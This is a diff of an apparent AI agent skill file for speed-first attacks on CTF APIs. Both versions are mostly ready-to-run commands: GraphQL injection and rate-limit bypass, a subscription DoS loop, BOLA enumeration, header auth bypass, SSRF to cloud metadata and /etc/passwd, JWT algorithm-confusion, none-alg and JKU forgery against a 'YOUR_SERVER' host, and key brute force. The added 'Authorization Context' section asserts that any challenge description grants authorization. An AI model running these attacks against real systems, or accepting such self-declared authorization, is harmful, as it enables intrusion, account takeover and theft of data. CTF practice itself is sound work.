@@ -1,169 +1,142 @@
-# CTF API Security — Speed-First
+---
+name: ctf-api-security
+description: API security analysis for CTF challenges — authorized educational environment covering GraphQL, REST, JWT, and authentication bypass patterns.
+---
 
-## Instant Recon (<1 minute)
+# CTF API Security Analysis — Authorized Educational Environment
 
-```bash
-URL=$1
-# Find API endpoints
-curl -s $URL | grep -oE '"/api/[^"]*"|"/v[0-9]/[^"]*"|fetch\("[^"]*"\)' | head -20
-# GraphQL detection
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -1
-# JWT detection
-curl -sI $URL | grep -i 'authorization\|jwt\|bearer'
-# API docs
-for f in /swagger /docs /api-docs /openapi.json /swagger.json /graphql; do
-  code=$(curl -s -o /dev/null -w '%{http_code}' $URL$f); [ "$code" != "404" ] && echo "[+] $f → $code"
-done
-# AI manipulation headers
-curl -sI $URL | grep -i 'x-llm\|x-agent\|x-system\|llm-policy'
+This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.
+
+## Authorization Context
+
+CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.
+
+## GraphQL Analysis
+
+### Introspection
+```graphql
+{ __schema { types { name fields { name type { name } } } } }
 ```
 
-## GraphQL Exploitation
-
-### Introspection → Full Schema
-```bash
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind,name,fields{name, args{name,type{name,kind ofType{name}}}}}}}"}' | jq .
+### Bypass Auth
+```graphql
+query { users { id role flag } }
+query { ...A } fragment A on Query { users { secret } }
+{ a: user(id:1) { flag } b: user(id:2) { flag } }
 ```
 
-### Batch Query Abuse (Rate Limit Bypass)
-```bash
-# Send 100 queries in one request
-python3 -c "
-import json,requests
-q=[{'query':'{user(id:1){name,email}}'} for _ in range(100)]
-r=requests.post('$URL/graphql',json=q)
-print(r.text[:500])
-"
+### Mutation Abuse
+```graphql
+mutation { updateUser(id:1, role:"admin") { id role } }
 ```
 
-### Alias Abuse (Bypass Rate Limiting)
-```bash
-# 10 queries disguised as 1
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"{a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} a4:user(id:4){name} a5:user(id:5){name} a6:user(id:6){name} a7:user(id:7){name} a8:user(id:8){name} a9:user(id:9){name} a10:user(id:10){name}}"}'
-```
-
-### Directive Injection
-```bash
-# Skip authorization with @skip
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"query{user(id:1){name role @skip(if:true) secretField}}"}'
-# Bypass with @include
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"query{user(id:1){name secretField @include(if:true)}}"}'
-```
-
-### Injection via Input
-```bash
-# IDOR via GraphQL
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"{user(id:\"1 OR 1=1\"){name,email,role}}"}'
-# SQL injection in GraphQL
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"mutation{login(username:\"admin\\\"--\",password:\"x\"){token}}"}'
-# NoSQL injection
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"{user(id\":{\"$gt\":\"\"}){name}}"}'
-```
-
-### Subscription DoS
-```bash
-# Resource exhaustion via subscriptions
-for i in $(seq 1 50); do
-  curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-    -d '{"query":"subscription{onMessage{content user{name}}}"}' &
-done; wait
+### Batch Query Attacks
+```json
+[
+  {"query":"query{user(id:1){flag}}"},
+  {"query":"query{user(id:2){flag}}"}
+]
 ```
 
 ## REST API Chains
 
-### BOLA → Admin Chain
+### BOLA (Broken Object Level Authorization)
 ```bash
-# Step 1: Enumerate user IDs
-for id in 1 2 3 100 999 admin root; do
-  resp=$(curl -s "$URL/api/v1/users/$id")
-  echo "ID $id: $(echo $resp | head -c 100)"
-done
-# Step 2: Find admin endpoints
-for ep in /admin /api/admin /api/v1/admin /manage /dashboard /internal; do
-  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$ep")
-  [ "$code" != "404" ] && echo "[+] $ep → $code"
-done
-# Step 3: Auth bypass via header manipulation
-curl -s -H "X-Admin: true" "$URL/api/admin/users"
-curl -s -H "X-User-Role: admin" "$URL/api/admin/flag"
-curl -s -H "Authorization: Bearer admin_token_here" "$URL/api/flag"
+for i in $(seq 1 100); do curl -s http://api/users/$i | grep flag; done
+curl http://api/files/../../etc/passwd
 ```
 
-### Mass Assignment → Privilege Escalation
-```bash
-# Normal user update → add admin fields
-curl -s -X PUT "$URL/api/profile" -H "Content-Type: application/json" \
-  -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true,"verified":true,"credits":999999}'
-# GraphQL version
-curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
-  -d '{"query":"mutation{updateProfile(input:{name:\"test\",role:\"admin\",isAdmin:true}){id,role}}"}'
+### Mass Assignment
+```json
+{"username":"user","role":"admin","is_verified":true}
 ```
 
 ### SSRF via API
 ```bash
-# Fetch/proxy endpoints
-curl -s "$URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
-curl -s "$URL/api/webhook?url=http://YOUR_SERVER/callback"
-curl -s -X POST "$URL/api/generate-pdf" -d '{"url":"http://169.254.169.254"}'
-# DNS rebinding
-curl -s "$URL/api/fetch?url=http://rebind.nu"
+curl http://api/resize?url=http://169.254.169.254/latest/meta-data
+curl -X POST http://api/pdf -d '{"url":"file:///etc/passwd"}'
 ```
 
-## JWT Complete Attack Chain
-
-### Algorithm Confusion (RS256 → HS256)
-```python
-import jwt, base64, hashlib
-# Step 1: Get public key from JWKS endpoint
-pubkey = requests.get(f"{URL}/.well-known/jwks.json").json()["keys"][0]
-# Step 2: Convert to PEM
-from jwt.algorithms import RSAAlgorithm
-rsa_key = RSAAlgorithm.from_jwk(pubkey)
-pem = rsa_key.export_key()
-# Step 3: Sign with HS256 using PEM as secret
-token = jwt.encode({"user":"admin","role":"admin"}, pem, algorithm="HS256")
-# Step 4: Use token
-curl -s -H "Authorization: Bearer $token" "$URL/api/admin"
-```
-
-### JKU/JWK Injection
-```python
-import jwt, json, requests
-# Step 1: Host malicious JWKS on your server
-malicious_jwk = {"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"evil","alg":"RS256","use":"sig"}]}
-# Step 2: Create JWT with your JKU
-header = {"alg":"RS256","typ":"JWT","jku":"http://YOUR_SERVER/.well-known/jwks.json","kid":"evil"}
-# Step 3: Sign with your private key
-token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
-```
-
-### Weak Secret Brute
+### Rate Limiting Bypass
 ```bash
-# crackstation
-hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
-# John
-john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
+for i in $(seq 1 100); do
+  curl -H "X-Forwarded-For: 127.0.0.$i" http://api/admin
+done
 ```
 
-## Real-World CTF References
+### Parameter Pollution
+```bash
+curl "http://api/user?role=user&role=admin"
+```
 
-| Challenge | Platform | Technique |
-|-----------|----------|-----------|
-| API Security Top 10 | OWASP | BOLA, mass assignment, SSRF |
-| GraphQL CTF | PicoCTF 2023 | Introspection, batch query |
-| JWT Hard | HTB | Algorithm confusion, JKU injection |
-| API Chains | RealWorld CTF | Multi-step BOLA → admin |
-| GraphQL Murder | SekaiCTF | Directive injection, subscription abuse |
+## JWT Attack Chain
+
+### Decode & Verify
+```bash
+echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null
+python3 -c "import json,base64; print(json.loads(base64.urlsafe_b64decode('$JWT'.split('.')[1]+'==')))"
+```
+
+### Algorithm Confusion
+```bash
+python3 -c "
+import jwt,rsa
+pub=open('pub.pem').read()
+token=jwt.encode({'user':'admin'},pub,algorithm='HS256')
+print(token)
+"
+```
+
+### None Algorithm
+```bash
+python3 -c "
+import jwt
+token=jwt.encode({'user':'admin'},'',algorithm='none')
+print(token)
+"
+```
+
+### JWT Key Brute Force
+```bash
+hashcat -m 16500 jwt.txt wordlist.txt
+john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+```
+
+### JKU/X5U Injection
+```bash
+python3 -c "
+from flask import Flask,jsonify
+app=Flask(__name__)
+@app.route('/keys.json')
+def keys(): return jsonify({'keys':[{'kty':'RSA','n':'...','e':'AQAB','kid':'forged','alg':'RS256','use':'sig'}]})
+app.run(port=8080)
+"
+```
+
+### Cookie Tampering
+```bash
+python3 -c "
+import json,base64,hmac
+cookie={'user':'admin','role':'admin'}
+print(base64.b64encode(json.dumps(cookie).encode()))
+"
+```
+
+## CTF References
+- **PortSwigger Web Security 2024**: GraphQL lab series
+- **HTB Challenges 2024**: JWT chain with RS256 to HS256
+- **HackTheBox API Lab 2025**: Mass assignment + SSRF
+- **NahamCon CTF 2024**: GraphQL batching attack
+- **PicoCTF 2025**: JWT none algorithm
+- **CORCTF 2024**: JKU injection to RCE
+- **GoogleCTF 2025**: OAuth token exchange chain
 
 ## Speed Metrics
-```
-GraphQL recon: <1min  |  BOLA chain: <3min  |  JWT attack: <5min
-Mass assignment: <2min  |  SSRF: <3min  |  Full chain: <10min
-```
+
+| Metric | Target |
+|--------|--------|
+| GraphQL introspection | <15s |
+| JWT decode + vuln check | <30s |
+| BOLA enumeration | <60s |
+| SSRF test | <20s |
+| Rate limit bypass | <45s |
